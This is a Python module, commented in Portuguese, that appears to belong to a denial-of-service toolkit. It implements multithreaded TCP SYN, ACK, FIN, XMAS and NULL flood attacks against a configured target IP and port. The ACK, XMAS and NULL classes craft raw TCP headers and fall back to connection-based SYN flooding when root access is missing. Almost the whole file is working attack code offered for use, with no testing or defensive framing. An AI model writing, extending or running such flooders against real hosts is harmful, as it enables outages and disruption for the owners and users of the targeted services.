"""
Implementação de ataques TCP
"""
import socket
import time
import random
import struct
import threading
from typing import Optional
from .base import BaseAttack
from ..core.config import AttackConfig

class TCPSynFlood(BaseAttack):
    """TCP SYN Flood Attack"""
    
    def execute(self):
        self.running = True
        print("🚀 Iniciando TCP SYN Flood...")
        
        def attack_thread(thread_id):
            packets_sent = 0
            start_time = time.time()
            
            while (not self.stop_event.is_set() and 
                   (time.time() - start_time) < self.config.duration):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    # Tenta conectar (envia SYN)
                    sock.connect((self.config.target_ip, self.config.target_port))
                    packets_sent += 1
                    self._update_stats(60)  # Tamanho aproximado do pacote SYN
                    sock.close()
                    time.sleep(0.01)  # Pequena pausa entre conexões
                    
                except (socket.timeout, ConnectionRefusedError, OSError):
                    self._handle_error()
                except Exception as e:
                    self._handle_error()
            
            print(f"🧵 Thread {thread_id} finalizada: {packets_sent} pacotes")
        
        # Inicia múltiplas threads
        threads = []
        for i in range(self.config.threads):
            if self.stop_event.is_set():
                break
            thread = threading.Thread(target=attack_thread, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # Aguarda todas as threads terminarem ou timeout
        for thread in threads:
            thread.join(timeout=self.config.duration + 5)

class TCPAckFlood(BaseAttack):
    """TCP ACK Flood Attack"""
    
    def execute(self):
        self.running = True
        print("🚀 Iniciando TCP ACK Flood...")
        
        # Verifica se temos privilégios para raw sockets
        try:
            test_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            test_sock.close()
            
            def attack_thread(thread_id):
                packets_sent = 0
                start_time = time.time()
                
                while (not self.stop_event.is_set() and 
                       (time.time() - start_time) < self.config.duration):
                    try:
                        self._send_ack_packet()
                        packets_sent += 1
                        self._update_stats(40)
                    except Exception:
                        self._handle_error()
                
                print(f"🧵 Thread {thread_id} finalizada: {packets_sent} pacotes ACK")
            
            # Raw sockets são mais pesados, usa menos threads
            threads = []
            max_threads = min(self.config.threads, 10)
            
            for i in range(max_threads):
                if self.stop_event.is_set():
                    break
                thread = threading.Thread(target=attack_thread, args=(i,))
                thread.daemon = True
                thread.start()
                threads.append(thread)
            
            for thread in threads:
                thread.join(timeout=self.config.duration + 5)
                
        except PermissionError:
            print("❌ Erro: Precisa de privilégios de root/admin para ACK Flood")
            print("💡 Executando TCP SYN Flood como alternativa...")
            # Fallback para SYN flood
            syn_flood = TCPSynFlood(self.config, self.stats_manager)
            syn_flood.stop_event = self.stop_event
            syn_flood.execute()
        except Exception as e:
            self._handle_error()
    
    def _send_ack_packet(self):
        """Envia pacote TCP ACK personalizado"""
        try:
            # Cria socket raw (requer privilégios)
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            
            # Configura o pacote TCP com flag ACK
            source_port = random.randint(1024, 65535)
            seq_num = random.randint(0, 4294967295)
            ack_num = random.randint(0, 4294967295)
            
            # Cabeçalho TCP
            tcp_header = self._build_tcp_header(
                source_port, self.config.target_port, seq_num, ack_num, 'A'
            )
            
            # Envia para o alvo
            sock.sendto(tcp_header, (self.config.target_ip, self.config.target_port))
            sock.close()
            
        except Exception:
            raise
    
    def _build_tcp_header(self, src_port: int, dst_port: int, seq: int, ack: int, flags: str) -> bytes:
        """Constrói cabeçalho TCP"""
        offset_reserved = (5 << 4) | 0
        tcp_flags = 0
        
        if 'S' in flags:  # SYN
            tcp_flags |= 0x02
        if 'A' in flags:  # ACK
            tcp_flags |= 0x10
        if 'F' in flags:  # FIN
            tcp_flags |= 0x01
        if 'R' in flags:  # RST
            tcp_flags |= 0x04
        if 'P' in flags:  # PSH
            tcp_flags |= 0x08
        if 'U' in flags:  # URG
            tcp_flags |= 0x20
        
        window = 5840
        checksum = 0
        urg_ptr = 0
        
        tcp_header = struct.pack(
            '!HHIIBBHHH',
            src_port, dst_port, seq, ack, offset_reserved, tcp_flags,
            window, checksum, urg_ptr
        )
        
        return tcp_header

class TCPFinFlood(BaseAttack):
    """TCP FIN Flood Attack"""
    
    def execute(self):
        self.running = True
        print("🚀 Iniciando TCP FIN Flood...")
        
        def attack_thread(thread_id):
            packets_sent = 0
            start_time = time.time()
            
            while (not self.stop_event.is_set() and 
                   (time.time() - start_time) < self.config.duration):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    sock.connect((self.config.target_ip, self.config.target_port))
                    # Envia FIN imediatamente após conectar
                    sock.shutdown(socket.SHUT_WR)
                    packets_sent += 1
                    self._update_stats(40)
                    sock.close()
                    time.sleep(0.01)
                    
                except Exception:
                    self._handle_error()
            
            print(f"🧵 Thread {thread_id} finalizada: {packets_sent} pacotes FIN")
        
        threads = []
        for i in range(self.config.threads):
            if self.stop_event.is_set():
                break
            thread = threading.Thread(target=attack_thread, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        for thread in threads:
            thread.join(timeout=self.config.duration + 5)

class TCPXmasAttack(BaseAttack):
    """TCP XMAS Attack (FIN/URG/PSH)"""
    
    def execute(self):
        self.running = True
        print("🚀 Iniciando TCP XMAS Attack...")
        
        try:
            # Verifica privilégios
            test_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            test_sock.close()
            
            def attack_thread(thread_id):
                packets_sent = 0
                start_time = time.time()
                
                while (not self.stop_event.is_set() and 
                       (time.time() - start_time) < self.config.duration):
                    try:
                        self._send_xmas_packet()
                        packets_sent += 1
                        self._update_stats(40)
                    except Exception:
                        self._handle_error()
                
                print(f"🧵 Thread {thread_id} finalizada: {packets_sent} pacotes XMAS")
            
            threads = []
            max_threads = min(self.config.threads, 10)
            
            for i in range(max_threads):
                if self.stop_event.is_set():
                    break
                thread = threading.Thread(target=attack_thread, args=(i,))
                thread.daemon = True
                thread.start()
                threads.append(thread)
            
            for thread in threads:
                thread.join(timeout=self.config.duration + 5)
                
        except PermissionError:
            print("❌ Erro: Precisa de privilégios de root/admin para XMAS Attack")
            print("💡 Executando TCP SYN Flood como alternativa...")
            syn_flood = TCPSynFlood(self.config, self.stats_manager)
            syn_flood.stop_event = self.stop_event
            syn_flood.execute()
        except Exception as e:
            self._handle_error()
    
    def _send_xmas_packet(self):
        """Envia pacote XMAS (FIN/URG/PSH)"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            
            source_port = random.randint(1024, 65535)
            seq_num = random.randint(0, 4294967295)
            
            # Constrói pacote com flags FIN, URG e PSH
            tcp_header = self._build_tcp_header(
                source_port, self.config.target_port, seq_num, 0, 'FUP'
            )
            
            sock.sendto(tcp_header, (self.config.target_ip, self.config.target_port))
            sock.close()
            
        except Exception:
            raise
    
    def _build_tcp_header(self, src_port: int, dst_port: int, seq: int, ack: int, flags: str) -> bytes:
        """Constrói cabeçalho TCP para XMAS"""
        offset_reserved = (5 << 4) | 0
        tcp_flags = 0
        
        if 'F' in flags:  # FIN
            tcp_flags |= 0x01
        if 'U' in flags:  # URG
            tcp_flags |= 0x20
        if 'P' in flags:  # PSH
            tcp_flags |= 0x08
        
        window = 5840
        checksum = 0
        urg_ptr = 1  # URG pointer ativado
        
        return struct.pack(
            '!HHIIBBHHH',
            src_port, dst_port, seq, ack, offset_reserved, tcp_flags,
            window, checksum, urg_ptr
        )

class TCPNullAttack(BaseAttack):
    """TCP NULL Attack (sem flags)"""
    
    def execute(self):
        self.running = True
        print("🚀 Iniciando TCP NULL Attack...")
        
        try:
            # Verifica privilégios
            test_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            test_sock.close()
            
            def attack_thread(thread_id):
                packets_sent = 0
                start_time = time.time()
                
                while (not self.stop_event.is_set() and 
                       (time.time() - start_time) < self.config.duration):
                    try:
                        self._send_null_packet()
                        packets_sent += 1
                        self._update_stats(40)
                    except Exception:
                        self._handle_error()
                
                print(f"🧵 Thread {thread_id} finalizada: {packets_sent} pacotes NULL")
            
            threads = []
            max_threads = min(self.config.threads, 10)
            
            for i in range(max_threads):
                if self.stop_event.is_set():
                    break
                thread = threading.Thread(target=attack_thread, args=(i,))
                thread.daemon = True
                thread.start()
                threads.append(thread)
            
            for thread in threads:
                thread.join(timeout=self.config.duration + 5)
                
        except PermissionError:
            print("❌ Erro: Precisa de privilégios de root/admin para NULL Attack")
            print("💡 Executando TCP SYN Flood como alternativa...")
            syn_flood = TCPSynFlood(self.config, self.stats_manager)
            syn_flood.stop_event = self.stop_event
            syn_flood.execute()
        except Exception as e:
            self._handle_error()
    
    def _send_null_packet(self):
        """Envia pacote TCP sem flags"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            
            source_port = random.randint(1024, 65535)
            seq_num = random.randint(0, 4294967295)
            
            # Pacote sem flags
            tcp_header = self._build_tcp_header(
                source_port, self.config.target_port, seq_num, 0, ''
            )
            
            sock.sendto(tcp_header, (self.config.target_ip, self.config.target_port))
            sock.close()
            
        except Exception:
            raise
    
    def _build_tcp_header(self, src_port: int, dst_port: int, seq: int, ack: int, flags: str) -> bytes:
        """Constrói cabeçalho TCP sem flags"""
        offset_reserved = (5 << 4) | 0
        tcp_flags = 0  # Sem flags
        
        window = 5840
        checksum = 0
        urg_ptr = 0
        
        return struct.pack(
            '!HHIIBBHHH',
            src_port, dst_port, seq, ack, offset_reserved, tcp_flags,
            window, checksum, urg_ptr
        )